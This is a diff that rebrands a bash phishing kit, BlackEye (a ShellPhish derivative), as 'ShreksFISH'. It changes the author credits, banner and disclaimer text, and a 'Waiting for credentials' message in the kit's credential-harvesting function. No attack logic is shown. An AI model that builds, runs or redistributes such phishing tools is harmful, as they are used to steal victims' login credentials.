@@ -1,6 +1,6 @@
 #!/bin/bash
-# BLACKEYE v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
-# Coded by: @thebhikandeshmukh (https://github.com/thebhikandeshmukh/blackeye)
+# ShreksFISH v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
+# Coded by: @SrikeshMaharaj (https://github.com/SrikeshMaharaj/ShreksFISH)
 
 
 trap 'printf "\n";stop;exit 1' 2
@@ -211,13 +211,13 @@ fi
 
 banner() {
 
-printf "     \e[101m\e[1;77m::                    *BLACKEYE v2.0*.                       ::\e[0m\n"
+printf "     \e[101m\e[1;77m::                    *ShreksFISH v2.0*.                       ::\e[0m\n"
 printf "\n"
 printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShreksFISH.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m::          Follow on Instagram @thebhikandeshmukh           ::\e[0m\n"
+printf "     \e[101m\e[1;77m::          Follow on Instagram @SrikeshMaharaj           ::\e[0m\n"
 printf "\n"
 }
 
@@ -281,7 +281,7 @@ exit 1
 }
 
 getcredentials() {
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
 while [ true ]; do
 
 
